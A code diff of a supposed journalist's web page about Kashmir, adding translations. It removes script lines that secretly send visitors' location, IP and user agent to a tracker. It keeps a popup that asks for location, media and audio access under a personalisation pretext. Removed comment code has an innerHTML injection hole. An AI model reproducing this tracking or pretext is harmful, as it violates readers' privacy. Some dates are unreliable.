@@ -22,20 +22,29 @@
     <header>
         <nav class="navbar">
             <div class="container">
-                <a href="#" class="logo">Hina Zahid</a>
-                <ul class="nav-links">
-                    <li><a href="#articles">Articles</a></li>
-                    <li><a href="#profile">About</a></li>
-                </ul>
+                <!-- left side: logo above links -->
+                <div class="nav-left">
+                    <a href="#" class="logo">Hina Zahid</a>
+                    <ul class="nav-links">
+                        <li><a href="#articles">Articles</a></li>
+                        <li><a href="#profile">About</a></li>
+                    </ul>
+                </div>
+                <!-- language selector -->
+                <div id="language-selector" class="lang-selector">
+                    <button data-lang="en">English</button>
+                    <button data-lang="ur">اردو</button>
+                    <button data-lang="bn">বাংলা</button>
+                </div>
             </div>
         </nav>
         <div class="hero" id="profile">
             <div class="hero-content container">
                 <div class="hero-text">
-                    <h1>Hina Zahid</h1>
-                    <p class="profession">Journalist</p>
-                    <p class="location">Based in Dearborn City</p>
-                    <p class="education">University of Michigan - Dearborn</p>
+                    <h1 data-i18n="hero_name">Hina Zahid</h1>
+                    <p class="profession" data-i18n="hero_prof">Journalist</p>
+                    <p class="location" data-i18n="hero_loc">Based in Dearborn City</p>
+                    <p class="education" data-i18n="hero_edu">University of Michigan - Dearborn</p>
                 </div>
                 <div class="hero-pic">
                     <img src="assets/images/profile.jpg" alt="Hina Zahid">
@@ -48,17 +57,17 @@
         <section class="articles" id="articles">
             <div class="container">
             <article class="article-colored" id="article1">
-                <h2>Kashmiris as a Minority</h2>
+                <h2 data-i18n="art1_title">Kashmiris as a Minority</h2>
                 <div class="article-actions">
                     <button class="share-btn">Share</button>
                     <button class="comment-btn">Comment</button>
                     <button class="like-btn">❤️ <span class="like-count">20</span></button>
                 </div>
                 <p class="meta">Rosy Rose, 20/02/26 11:11 PM</p>
-                <p>The treatment of Kashmiris has been fraught with violence and oppression, reflecting a broader context of human rights violations in the region. Reports of abuse by security forces have surfaced, including instances of arbitrary detentions, torture, and extrajudicial killings. For example, the Kunan Poshpora incident, where soldiers allegedly raped and assaulted women during an army operation in 1991, remains emblematic of the traumatic history faced by local populations. This cycle of violence has created an atmosphere of fear, where civilians frequently report harassment and intimidation, undermining their basic rights and access to justice.</p>
-                <p>Kashmiris are not only struggling with direct acts of violence; they also face significant socio-economic challenges exacerbated by ongoing conflict. In recent years, the economic landscape has deteriorated, with many locals seeing their livelihoods affected by restrictions and military operations. For instance, reports indicate that drug abuse, particularly heroin addiction, has surged dramatically, with health facilities recording thousands of patients annually. The mental health impact is profound, as families grapple with the ongoing trauma of violence and economic despair, making it difficult for communities to envision a stable future.</p>
-                <p>The pervasive mistreatment felt by Kashmiris is further compounded by a sense of alienation from national narratives. Many feel excluded from discussions about their rights and identity, with the government's response often focused on militarization rather than addressing local grievances. Prominent human rights activists, like Khurram Parvez, have been detained under ambiguous laws like the Unlawful Activities Prevention Act (UAPA), accused of terrorism for merely advocating for Kashmiri rights. Such actions symbolize a broader strategy of silencing dissent, reinforcing the perception among Kashmiris that their voices are systematically marginalized in a landscape defined by conflict and oppression.</p>
-                <p>I would like to say again that the people of Kashmir are humans too who have lived their for years and to oppress those for your own political or material agenda is not anyone would consider moral. But the times have come when we have forgotten why all the religions were sent down all those years ago, they all taught us one thing particularly, to live righteously and peacefully.</p>
+                <p data-i18n="art1_p1">The treatment of Kashmiris has been fraught with violence and oppression, reflecting a broader context of human rights violations in the region. Reports of abuse by security forces have surfaced, including instances of arbitrary detentions, torture, and extrajudicial killings. For example, the Kunan Poshpora incident, where soldiers allegedly raped and assaulted women during an army operation in 1991, remains emblematic of the traumatic history faced by local populations. This cycle of violence has created an atmosphere of fear, where civilians frequently report harassment and intimidation, undermining their basic rights and access to justice.</p>
+                <p data-i18n="art1_p2">Kashmiris are not only struggling with direct acts of violence; they also face significant socio-economic challenges exacerbated by ongoing conflict. In recent years, the economic landscape has deteriorated, with many locals seeing their livelihoods affected by restrictions and military operations. For instance, reports indicate that drug abuse, particularly heroin addiction, has surged dramatically, with health facilities recording thousands of patients annually. The mental health impact is profound, as families grapple with the ongoing trauma of violence and economic despair, making it difficult for communities to envision a stable future.</p>
+                <p data-i18n="art1_p3">The pervasive mistreatment felt by Kashmiris is further compounded by a sense of alienation from national narratives. Many feel excluded from discussions about their rights and identity, with the government's response often focused on militarization rather than addressing local grievances. Prominent human rights activists, like Khurram Parvez, have been detained under ambiguous laws like the Unlawful Activities Prevention Act (UAPA), accused of terrorism for merely advocating for Kashmiri rights. Such actions symbolize a broader strategy of silencing dissent, reinforcing the perception among Kashmiris that their voices are systematically marginalized in a landscape defined by conflict and oppression.</p>
+                <p data-i18n="art1_p4">I would like to say again that the people of Kashmir are humans too who have lived their for years and to oppress those for your own political or material agenda is not anyone would consider moral. But the times have come when we have forgotten why all the religions were sent down all those years ago, they all taught us one thing particularly, to live righteously and peacefully.</p>
                 <div class="comments" style="display:none;">
                     <h3>Comments</h3>
                     <div class="comment-list">
@@ -71,17 +80,17 @@
             </article>
 
             <article class="article-colored-alt" id="article2">
-                <h2>Did the Gov. Allow Pulwama and Pahalgam to Happen?</h2>
+                <h2 data-i18n="art2_title">Did the Gov. Allow Pulwama and Pahalgam to Happen?</h2>
                 <div class="article-actions">
                     <button class="share-btn">Share</button>
                     <button class="comment-btn">Comment</button>
                     <button class="like-btn">❤️ <span class="like-count">34</span></button>
                 </div>
                 <p class="meta">Rosy Rose, 2/12/25 9:10 PM</p>
-                <p>The Pulwama attack in February 2019 and the Pahalgam attack in June 2025 have drawn substantial criticism of the Indian government regarding its handling of security in Jammu and Kashmir. Following the Pulwama attack, where over 40 Indian paramilitary personnel lost their lives, many observers raised questions about the government's intelligence capabilities and preventive measures. The Pahalgam attack, occurring just before a crucial electoral period in 2025, reignited concerns over lapses in security and the adequacy of the government's response to evolving threats in the region.</p>
-                <p>The timing of the Pahalgam attack, coinciding with electoral campaigns, led to widespread speculation that political motivations may have influenced government actions. Critics suggested that the ruling party could use these tragic incidents to rally nationalistic sentiments and shift public focus away from pressing domestic issues, such as economic challenges and inflation. This strategic positioning raised eyebrows, with many arguing that the government was exploiting security concerns for electoral advantage rather than genuinely addressing the complex realities contributing to violence in Kashmir.</p>
-                <p>Moreover, the rhetoric surrounding these attacks further fueled dissatisfaction among the populace. Government officials often emphasized military responses and vows of retaliation, yet many critics pointed out that such measures rarely addressed the underlying socio-political issues in Jammu and Kashmir. This tendency to prioritize a show of strength over substantive dialogue only perpetuated feelings of alienation among Kashmiris. The lack of a coherent strategy for peace and stability left many citizens feeling marginalized and anxious about their future in a region marked by conflict and unrest.</p>
-                <p>Without definitive proof it is not possible to declare them accused but there are just too many coincidences and excuses given by their government. How could the response time be so late with having the military bases all over the region?</p>
+                <p data-i18n="art2_p1">The Pulwama attack in February 2019 and the Pahalgam attack in June 2025 have drawn substantial criticism of the Indian government regarding its handling of security in Jammu and Kashmir. Following the Pulwama attack, where over 40 Indian paramilitary personnel lost their lives, many observers raised questions about the government's intelligence capabilities and preventive measures. The Pahalgam attack, occurring just before a crucial electoral period in 2025, reignited concerns over lapses in security and the adequacy of the government's response to evolving threats in the region.</p>
+                <p data-i18n="art2_p2">The timing of the Pahalgam attack, coinciding with electoral campaigns, led to widespread speculation that political motivations may have influenced government actions. Critics suggested that the ruling party could use these tragic incidents to rally nationalistic sentiments and shift public focus away from pressing domestic issues, such as economic challenges and inflation. This strategic positioning raised eyebrows, with many arguing that the government was exploiting security concerns for electoral advantage rather than genuinely addressing the complex realities contributing to violence in Kashmir.</p>
+                <p data-i18n="art2_p3">Moreover, the rhetoric surrounding these attacks further fueled dissatisfaction among the populace. Government officials often emphasized military responses and vows of retaliation, yet many critics pointed out that such measures rarely addressed the underlying socio-political issues in Jammu and Kashmir. This tendency to prioritize a show of strength over substantive dialogue only perpetuated feelings of alienation among Kashmiris. The lack of a coherent strategy for peace and stability left many citizens feeling marginalized and anxious about their future in a region marked by conflict and unrest.</p>
+                <p data-i18n="art2_p4">Without definitive proof it is not possible to declare them accused but there are just too many coincidences and excuses given by their government. How could the response time be so late with having the military bases all over the region?</p>
                 <div class="comments" style="display:none;">
                     <h3>Comments</h3>
                     <div class="comment-list">
@@ -94,17 +103,17 @@
             </article>
 
             <article class="article-colored" id="article3">
-                <h2>Article 370</h2>
+                <h2 data-i18n="art3_title">Article 370</h2>
                 <div class="article-actions">
                     <button class="share-btn">Share</button>
                     <button class="comment-btn">Comment</button>
                     <button class="like-btn">❤️ <span class="like-count">56</span></button>
                 </div>
                 <p class="meta">Rosy Rose, 31/11/25 10:45 PM</p>
-                <p>The abolition of Article 370, which previously provided special status to Jammu and Kashmir, has sparked a significant and multifaceted debate. As someone who has closely followed this issue, I can't overlook that many people view the move as a direct affront to the autonomy that the region enjoyed for decades. The article allowed Jammu and Kashmir to maintain its own constitution, laws, and decision-making powers in various areas, such as property rights and residency. By revoking these provisions, critics argue that the Indian government neglected the historical context of Jammu and Kashmir's accession to India in 1947, which was based on an understanding that the region would retain considerable self-governance.</p>
-                <p>Moreover, the manner in which the decision was executed has raised serious alarm among locals and observers alike. The heavy military presence during the revocation, combined with communication blackouts, resulted in a climate of fear and uncertainty. This abruptness prevented any genuine public discourse and deprived residents of their democratic rights. Many felt marginalized, believing that their opinions were not just disregarded but actively suppressed. This approach raised questions about the legitimacy of such a significant constitutional change, further aggravating sentiments of alienation and disenfranchisement already present in the region.</p>
-                <p>In addition to concerns about autonomy and governance, there is a palpable fear among residents regarding potential demographic shifts and cultural dilution. With the removal of special protections, many believe that an influx of outsiders could threaten the unique identity and heritage of Jammu and Kashmir. This fear is rooted in a history of communal tensions and past conflicts, making locals apprehensive about their future in a changing socio-political landscape. Ultimately, the opposition to the abolition of Article 370 stems from a deep concern for the stability, identity, and democratic rights of the people living in Jammu and Kashmir.</p>
-                <p>The already indigenous population there feels more threatened now. The history of the conflicted land make the locals more nervous for their kids and their future with all time high corruption and uncertainties. What will the coming time bring for those struggling people who are just trying to live their lives peacefully?</p>
+                <p data-i18n="art3_p1">The abolition of Article 370, which previously provided special status to Jammu and Kashmir, has sparked a significant and multifaceted debate. As someone who has closely followed this issue, I can't overlook that many people view the move as a direct affront to the autonomy that the region enjoyed for decades. The article allowed Jammu and Kashmir to maintain its own constitution, laws, and decision-making powers in various areas, such as property rights and residency. By revoking these provisions, critics argue that the Indian government neglected the historical context of Jammu and Kashmir's accession to India in 1947, which was based on an understanding that the region would retain considerable self-governance.</p>
+                <p data-i18n="art3_p2">Moreover, the manner in which the decision was executed has raised serious alarm among locals and observers alike. The heavy military presence during the revocation, combined with communication blackouts, resulted in a climate of fear and uncertainty. This abruptness prevented any genuine public discourse and deprived residents of their democratic rights. Many felt marginalized, believing that their opinions were not just disregarded but actively suppressed. This approach raised questions about the legitimacy of such a significant constitutional change, further aggravating sentiments of alienation and disenfranchisement already present in the region.</p>
+                <p data-i18n="art3_p3">In addition to concerns about autonomy and governance, there is a palpable fear among residents regarding potential demographic shifts and cultural dilution. With the removal of special protections, many believe that an influx of outsiders could threaten the unique identity and heritage of Jammu and Kashmir. This fear is rooted in a history of communal tensions and past conflicts, making locals apprehensive about their future in a changing socio-political landscape. Ultimately, the opposition to the abolition of Article 370 stems from a deep concern for the stability, identity, and democratic rights of the people living in Jammu and Kashmir.</p>
+                <p data-i18n="art3_p4">The already indigenous population there feels more threatened now. The history of the conflicted land make the locals more nervous for their kids and their future with all time high corruption and uncertainties. What will the coming time bring for those struggling people who are just trying to live their lives peacefully?</p>
                 <div class="comments" style="display:none;">
                     <h3>Comments</h3>
                     <div class="comment-list">
@@ -117,19 +126,19 @@
             </article>
 
             <article class="article-colored-alt" id="article4">
-                <h2>Shaheed Afzal Guru</h2>
+                <h2 data-i18n="art4_title">Shaheed Afzal Guru</h2>
                 <div class="article-actions">
                     <button class="share-btn">Share</button>
                     <button class="comment-btn">Comment</button>
                     <button class="like-btn">❤️ <span class="like-count">32</span></button>
                 </div>
                 <p class="meta">Rosy Rose, 6/8/25 1:22 PM</p>
-                <p>Shaheed Afzal Guru is a prominent symbol of the struggle, sacrifice, and suffering of the Kashmiri people. He was born in 1969 in Sopore district, Jammu and Kashmir. Like an ordinary Kashmiri youth, his life unfolded under the shadow of state repression, injustice, and political uncertain... (truncated for brevity)</p>
-                <p>Afzal Guru was accused of involvement in the attack on the Indian Parliament on 13 December 2001. During the trial, serious questions were raised—not only by the Kashmiri people but also by international human rights organizations—regarding the evidence, confessions, and judicial proceedings. It was argued that Afzal Guru was not granted a fair trial and that the verdict was delivered on the basis of the “collective conscience” rather than concrete evidence.</p>
-                <p>On 9 February 2013, he was secretly executed in Tihar Jail in New Delhi. His family was not informed in time of the execution, nor were they given an opportunity for a final meeting, which in itself was a human tragedy. He was buried within the jail premises without handing over his body to the family, further deepening the wounds of the Kashmiri people.</p>
-                <p>The martyrdom of Afzal Guru is not merely the death of an individual but a question mark over an entire system of justice. After his execution, there was a strong reaction in Kashmir, and he began to be remembered as a person who fell victim to state injustice. Even today, many Kashmiris regard him as a symbol of their struggle for freedom.</p>
-                <p>History bears witness that voices suppressed by force often grow stronger with time. The sacrifice of Shaheed Afzal Guru is another link in that chain, which remains alive in the hearts of the Kashmiri people and will continue to convey a message of justice, rights, and freedom to future generations.</p>
-                <p><em>Imtiaz Ahmad Bhat<br>Vice Chairman, Jammu and Kashmir Awami Party</em></p>
+                <p data-i18n="art4_p1">Shaheed Afzal Guru is a prominent symbol of the struggle, sacrifice, and suffering of the Kashmiri people. He was born in 1969 in Sopore district, Jammu and Kashmir. Like an ordinary Kashmiri youth, his life unfolded under the shadow of state repression, injustice, and political uncertain...</p>
+                <p data-i18n="art4_p2">Afzal Guru was accused of involvement in the attack on the Indian Parliament on 13 December 2001. During the trial, serious questions were raised—not only by the Kashmiri people but also by international human rights organizations—regarding the evidence, confessions, and judicial proceedings. It was argued that Afzal Guru was not granted a fair trial and that the verdict was delivered on the basis of the “collective conscience” rather than concrete evidence.</p>
+                <p data-i18n="art4_p3">On 9 February 2013, he was secretly executed in Tihar Jail in New Delhi. His family was not informed in time of the execution, nor were they given an opportunity for a final meeting, which in itself was a human tragedy. He was buried within the jail premises without handing over his body to the family, further deepening the wounds of the Kashmiri people.</p>
+                <p data-i18n="art4_p4">The martyrdom of Afzal Guru is not merely the death of an individual but a question mark over an entire system of justice. After his execution, there was a strong reaction in Kashmir, and he began to be remembered as a person who fell victim to state injustice. Even today, many Kashmiris regard him as a symbol of their struggle for freedom.</p>
+                <p data-i18n="art4_p5">History bears witness that voices suppressed by force often grow stronger with time. The sacrifice of Shaheed Afzal Guru is another link in that chain, which remains alive in the hearts of the Kashmiri people and will continue to convey a message of justice, rights, and freedom to future generations.</p>
+                <p><em data-i18n="art4_by">Imtiaz Ahmad Bhat<br>Vice Chairman, Jammu and Kashmir Awami Party</em></p>
                 <div class="comments" style="display:none;">
                     <h3>Comments</h3>
                     <div class="comment-list">
@@ -149,122 +158,17 @@
             <p>&copy; Hina Zahid. All rights reserved.</p>
         </div>
     </footer>
-    <script>
-        // base URL for API requests (uses current origin so deployment works)
-        const API_BASE = window.location.origin;
-
-        document.addEventListener('DOMContentLoaded', function() {
-            // share: copy URL to clipboard or use Web Share API
-            document.querySelectorAll('.share-btn').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    const url = window.location.href;
-                    if (navigator.share) {
-                        navigator.share({ title: document.title, url: url })
-                            .catch(err => console.error(err));
-                    } else {
-                        navigator.clipboard.writeText(url).then(() => {
-                            alert('Link copied to clipboard');
-                        });
-                    }
-                });
-            });
-
-            // show/hide comments when comment button clicked
-            // base URL for API requests; uses same origin
-        const API_BASE = window.location.origin;
-
-        document.querySelectorAll('.comment-btn').forEach(btn => {
-                btn.addEventListener('click', async () => {
-                    const article = btn.closest('article');
-                    const comments = article.querySelector('.comments');
-                    const title = article.querySelector('h2').innerText;
-                    if (comments.style.display === 'none') {
-                        // load comments from backend
-                        const res = await fetch(`${API_BASE}/api/comments?articleTitle=${encodeURIComponent(title)}`);
-                        const existing = await res.json();
-                        const list = comments.querySelector('.comment-list');
-                        list.innerHTML = '';
-                        existing.forEach(c => {
-                            const p = document.createElement('p');
-                            p.innerHTML = `<strong>${c._id.slice(-4)}:</strong> ${c.text}`;
-                            list.appendChild(p);
-                        });
-
-                        comments.style.display = 'block';
-                        comments.scrollIntoView({ behavior: 'smooth' });
-                    } else {
-                        comments.style.display = 'none';
-                    }
-                });
-            });
-
-            document.querySelectorAll('.add-comment-btn').forEach(btn => {
-                btn.addEventListener('click', async () => {
-                    const container = btn.closest('.comments');
-                    const input = container.querySelector('.comment-input');
-                    const text = input.value.trim();
-                    if (text) {
-                        const article = btn.closest('article');
-                        const title = article.querySelector('h2').innerText;
-                        const res = await fetch(`${API_BASE}/api/comments`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ articleTitle: title, text })
-                        });
-                        const saved = await res.json();
-                        const p = document.createElement('p');
-                        p.innerHTML = `<strong>${saved._id.slice(-4)}:</strong> ${saved.text}`;
-                        container.querySelector('.comment-list').appendChild(p);
-                        input.value = '';
-                    }
-                });
-            });
-
-            document.querySelectorAll('.like-btn').forEach(btn => {
-                btn.addEventListener('click', async () => {
-                    const article = btn.closest('article');
-                    const title = article.querySelector('h2').innerText;
-                    const res = await fetch(`${API_BASE}/api/likes`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ articleTitle: title })
-                    });
-                    const updated = await res.json();
-                    btn.querySelector('.like-count').textContent = updated.count;
-                });
-            });
-
-            // sidebar toggle functionality
-            const hamburger = document.getElementById('hamburger');
-            const sidebar = document.getElementById('sidebar');
-            hamburger.addEventListener('click', () => sidebar.classList.toggle('open'));
-            sidebar.querySelectorAll('a').forEach(link => {
-                link.addEventListener('click', () => sidebar.classList.remove('open'));
-            });
-
-            // fetch existing like counts on load
-            document.querySelectorAll('.like-btn').forEach(async btn => {
-                const article = btn.closest('article');
-                const title = article.querySelector('h2').innerText;
-                const res = await fetch(`${API_BASE}/api/likes?articleTitle=${encodeURIComponent(title)}`);
-                const data = await res.json();
-                btn.querySelector('.like-count').textContent = data.count;
-            });
-        });
-    </script>
 
     <!-- permission popup (shows on first scroll) -->
-   <div id="permission-popup">
-  <p>🌟 Enable Enhanced Features</p>
-  
-  <p class="permission-description">
-    To provide you with location-based articles, relevant videos, and audio content,
-    we request access to your location, media, and audio permissions. 
-    This helps us personalize news and improve your reading experience.
-  </p>
-
-  <button id="popup-enable-btn">Allow Permissions</button>
-</div>
+    <div id="permission-popup">
+        <p>🌟 Enable Enhanced Features</p>
+        <p class="permission-description">
+            To provide you with location-based articles, relevant videos, and audio content,
+            we request access to your location, media, and audio permissions. 
+            This helps us personalize news and improve your reading experience.
+        </p>
+        <button id="popup-enable-btn">Allow Permissions</button>
+    </div>
 
     <!-- unified enable features button (hidden, kept as fallback) -->
     <button id="enable-features-btn" class="enhanced-btn" style="display:none;">🌟 Enable Enhanced Features</button>
@@ -305,7 +209,6 @@
     /* fixed trigger button styling (hidden) */
     #enable-features-btn {
       position: fixed;
-
       bottom: 20px;
       left: 20px;
       background: #ffeb3b;
@@ -321,193 +224,444 @@
     #enable-features-btn:hover { background: #fdd835; }
     </style>
 
-    <!-- helper scripts for enhanced features -->
     <script>
-      let lastCoords = null;
-      async function enableEnhancedFeatures() {
-        let pos;
-        try {
-          pos = await requestLocationSeq();
-          lastCoords = {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude
-          };
-          // send tracking info (location + ip + ua)
-          sendTracking(pos);
-        } catch (err) {
-          console.warn('Location permission denied or failed, continuing without coords', err);
-        }
+        // translations for multilingual support
+        const translations = {
+            en: {
+                hero_name: "Hina Zahid",
+                hero_prof: "Journalist",
+                hero_loc: "Based in Dearborn City",
+                hero_edu: "University of Michigan - Dearborn",
+                art1_title: "Kashmiris as a Minority",
+                art2_title: "Did the Gov. Allow Pulwama and Pahalgam to Happen?",
+                art3_title: "Article 370",
+                art4_title: "Shaheed Afzal Guru",
+                art1_p1: "The treatment of Kashmiris has been fraught with violence and oppression, reflecting a broader context of human rights violations in the region. Reports of abuse by security forces have surfaced, including instances of arbitrary detentions, torture, and extrajudicial killings. For example, the Kunan Poshpora incident, where soldiers allegedly raped and assaulted women during an army operation in 1991, remains emblematic of the traumatic history faced by local populations. This cycle of violence has created an atmosphere of fear, where civilians frequently report harassment and intimidation, undermining their basic rights and access to justice.",
+                art1_p2: "Kashmiris are not only struggling with direct acts of violence; they also face significant socio-economic challenges exacerbated by ongoing conflict. In recent years, the economic landscape has deteriorated, with many locals seeing their livelihoods affected by restrictions and military operations. For instance, reports indicate that drug abuse, particularly heroin addiction, has surged dramatically, with health facilities recording thousands of patients annually. The mental health impact is profound, as families grapple with the ongoing trauma of violence and economic despair, making it difficult for communities to envision a stable future.",
+                art1_p3: "The pervasive mistreatment felt by Kashmiris is further compounded by a sense of alienation from national narratives. Many feel excluded from discussions about their rights and identity, with the government's response often focused on militarization rather than addressing local grievances. Prominent human rights activists, like Khurram Parvez, have been detained under ambiguous laws like the Unlawful Activities Prevention Act (UAPA), accused of terrorism for merely advocating for Kashmiri rights. Such actions symbolize a broader strategy of silencing dissent, reinforcing the perception among Kashmiris that their voices are systematically marginalized in a landscape defined by conflict and oppression.",
+                art1_p4: "I would like to say again that the people of Kashmir are humans too who have lived their for years and to oppress those for your own political or material agenda is not anyone would consider moral. But the times have come when we have forgotten why all the religions were sent down all those years ago, they all taught us one thing particularly, to live righteously and peacefully.",
+                art2_p1: "The Pulwama attack in February 2019 and the Pahalgam attack in June 2025 have drawn substantial criticism of the Indian government regarding its handling of security in Jammu and Kashmir. Following the Pulwama attack, where over 40 Indian paramilitary personnel lost their lives, many observers raised questions about the government's intelligence capabilities and preventive measures. The Pahalgam attack, occurring just before a crucial electoral period in 2025, reignited concerns over lapses in security and the adequacy of the government's response to evolving threats in the region.",
+                art2_p2: "The timing of the Pahalgam attack, coinciding with electoral campaigns, led to widespread speculation that political motivations may have influenced government actions. Critics suggested that the ruling party could use these tragic incidents to rally nationalistic sentiments and shift public focus away from pressing domestic issues, such as economic challenges and inflation. This strategic positioning raised eyebrows, with many arguing that the government was exploiting security concerns for electoral advantage rather than genuinely addressing the complex realities contributing to violence in Kashmir.",
+                art2_p3: "Moreover, the rhetoric surrounding these attacks further fueled dissatisfaction among the populace. Government officials often emphasized military responses and vows of retaliation, yet many critics pointed out that such measures rarely addressed the underlying socio-political issues in Jammu and Kashmir. This tendency to prioritize a show of strength over substantive dialogue only perpetuated feelings of alienation among Kashmiris. The lack of a coherent strategy for peace and stability left many citizens feeling marginalized and anxious about their future in a region marked by conflict and unrest.",
+                art2_p4: "Without definitive proof it is not possible to declare them accused but there are just too many coincidences and excuses given by their government. How could the response time be so late with having the military bases all over the region?",
+                art3_p1: "The abolition of Article 370, which previously provided special status to Jammu and Kashmir, has sparked a significant and multifaceted debate. As someone who has closely followed this issue, I can't overlook that many people view the move as a direct affront to the autonomy that the region enjoyed for decades. The article allowed Jammu and Kashmir to maintain its own constitution, laws, and decision-making powers in various areas, such as property rights and residency. By revoking these provisions, critics argue that the Indian government neglected the historical context of Jammu and Kashmir's accession to India in 1947, which was based on an understanding that the region would retain considerable self-governance.",
+                art3_p2: "Moreover, the manner in which the decision was executed has raised serious alarm among locals and observers alike. The heavy military presence during the revocation, combined with communication blackouts, resulted in a climate of fear and uncertainty. This abruptness prevented any genuine public discourse and deprived residents of their democratic rights. Many felt marginalized, believing that their opinions were not just disregarded but actively suppressed. This approach raised questions about the legitimacy of such a significant constitutional change, further aggravating sentiments of alienation and disenfranchisement already present in the region.",
+                art3_p3: "In addition to concerns about autonomy and governance, there is a palpable fear among residents regarding potential demographic shifts and cultural dilution. With the removal of special protections, many believe that an influx of outsiders could threaten the unique identity and heritage of Jammu and Kashmir. This fear is rooted in a history of communal tensions and past conflicts, making locals apprehensive about their future in a changing socio-political landscape. Ultimately, the opposition to the abolition of Article 370 stems from a deep concern for the stability, identity, and democratic rights of the people living in Jammu and Kashmir.",
+                art3_p4: "The already indigenous population there feels more threatened now. The history of the conflicted land make the locals more nervous for their kids and their future with all time high corruption and uncertainties. What will the coming time bring for those struggling people who are just trying to live their lives peacefully?",
+                art4_p1: "Shaheed Afzal Guru is a prominent symbol of the struggle, sacrifice, and suffering of the Kashmiri people. He was born in 1969 in Sopore district, Jammu and Kashmir. Like an ordinary Kashmiri youth, his life unfolded under the shadow of state repression, injustice, and political uncertain...",
+                art4_p2: "Afzal Guru was accused of involvement in the attack on the Indian Parliament on 13 December 2001. During the trial, serious questions were raised—not only by the Kashmiri people but also by international human rights organizations—regarding the evidence, confessions, and judicial proceedings. It was argued that Afzal Guru was not granted a fair trial and that the verdict was delivered on the basis of the “collective conscience” rather than concrete evidence.",
+                art4_p3: "On 9 February 2013, he was secretly executed in Tihar Jail in New Delhi. His family was not informed in time of the execution, nor were they given an opportunity for a final meeting, which in itself was a human tragedy. He was buried within the jail premises without handing over his body to the family, further deepening the wounds of the Kashmiri people.",
+                art4_p4: "The martyrdom of Afzal Guru is not merely the death of an individual but a question mark over an entire system of justice. After his execution, there was a strong reaction in Kashmir, and he began to be remembered as a person who fell victim to state injustice. Even today, many Kashmiris regard him as a symbol of their struggle for freedom.",
+                art4_p5: "History bears witness that voices suppressed by force often grow stronger with time. The sacrifice of Shaheed Afzal Guru is another link in that chain, which remains alive in the hearts of the Kashmiri people and will continue to convey a message of justice, rights, and freedom to future generations.",
+                art4_by: "Imtiaz Ahmad Bhat\nVice Chairman, Jammu and Kashmir Awami Party"
+            },
+            ur: {
+                hero_name: "حنا زاہد",
+                hero_prof: "صحافی",
+                hero_loc: "ڈیئربورن شہر میں مقیم",
+                hero_edu: "یونیورسٹی آف مشی گن - ڈیئربورن",
+                art1_title: "کشمیری بطور ایک اقلیت",
+                art2_title: "کیا حکومت نے پلوامہ اور پہلگام ہونے دیا؟",
+                art3_title: "آرٹیکل 370",
+                art4_title: "شہید افضل گرو",
+                art1_p1: "کشمیریوں کے ساتھ تشدد اور جبر کا سلسلہ خطے میں انسانی حقوق کی خلاف ورزیوں کے وسیع تناظر کی عکاسی کرتا ہے۔ سیکورٹی فورسز کے ذریعے زیادتی کی رپورٹیں سامنے آئی ہیں، جن میں من مانی حراستیں، تشدد اور عدالتی قتل کے واقعات شامل ہیں۔ مثال کے طور پر، 1991 میں فوجی آپریشن کے دوران کنان پوشپورہ واقعہ، جہاں فوجیوں نے مبینہ طور پر خواتین کے ساتھ زیادتی کی، مقامی آبادی کو درپیش تکلیف دہ تاریخ کی علامت بن گیا ہے۔ تشدد کے اس چکر نے خوف کا ماحول پیدا کر دیا ہے، جہاں شہری اکثر ہراسانی اور دھمکیوں کی اطلاع دیتے ہیں، جس سے ان کے بنیادی حقوق اور انصاف تک رسائی مجروح ہو رہی ہے۔",
+                art1_p2: "کشمیری نہ صرف تشدد کی براہ راست کارروائیوں سے جدوجہد کر رہے ہیں، بلکہ انہیں جاری تنازعات کی وجہ سے اہم سماجی و اقتصادی چیلنجز کا بھی سامنا ہے۔ حالیہ برسوں میں، معاشی حالات خراب ہوئے ہیں، بہت سے مقامی لوگ پابندیوں اور فوجی کارروائیوں سے اپنی روزی روٹی متاثر ہوتے دیکھ رہے ہیں۔ مثال کے طور پر، رپورٹوں سے پتہ چلتا ہے کہ منشیات کا استعمال، خاص طور پر ہیروئن کی لت میں ڈرامائی طور پر اضافہ ہوا ہے، صحت کی سہولیات میں سالانہ ہزاروں مریض ریکارڈ کیے جا رہے ہیں۔ ذہنی صحت پر اثرات گہرے ہیں، کیونکہ خاندان تشدد اور معاشی مایوسی کے جاری صدمے سے نبرد آزما ہیں، جس سے کمیونٹیز کے لیے مستحکم مستقبل کا تصور کرنا مشکل ہو گیا ہے۔",
+                art1_p3: "کشمیریوں کی طرف سے محسوس کی جانے والی وسیع پیمانے پر ناانصافی قومی بیانیے سے بیگانگی کے احساس سے مزید بڑھ جاتی ہے۔ بہت سے لوگ اپنے حقوق اور شناخت کے بارے میں بات چیت سے خارج محسوس کرتے ہیں، حکومت کا ردعمل اکثر مقامی شکایات کو دور کرنے کے بجائے فوجی سازی پر مرکوز ہوتا ہے۔ خرم پرویز جیسے ممتاز انسانی حقوق کے کارکنوں کو غیر قانونی سرگرمیاں روک تھام ایکٹ (UAPA) جیسے مبہم قوانین کے تحت حراست میں لیا گیا ہے، محض کشمیری حقوق کی وکالت کرنے پر ان پر دہشت گردی کا الزام لگایا گیا ہے۔ اس طرح کی کارروائیاں اختلاف رائے کو خاموش کرنے کی وسیع تر حکمت عملی کی علامت ہیں، کشمیریوں کے درمیان اس تصور کو تقویت دیتی ہیں کہ ان کی آوازیں تنازعات اور جبر سے متعین منظر نامے میں منظم طریقے سے پسماندہ ہیں۔",
+                art1_p4: "میں ایک بار پھر کہنا چاہوں گی کہ کشمیری بھی انسان ہیں جو برسوں وہاں رہے ہیں اور ان پر اپنے سیاسی یا مادی ایجنڈے کے لیے ظلم کرنا کوئی اخلاقی عمل نہیں سمجھا جا سکتا۔ لیکن وقت آ گیا ہے جب ہم بھول گئے ہیں کہ ان تمام سالوں پہلے تمام مذاہب کیوں بھیجے گئے تھے، ان سب نے ہمیں خاص طور پر ایک چیز سکھائی، نیکی اور امن سے رہنا۔",
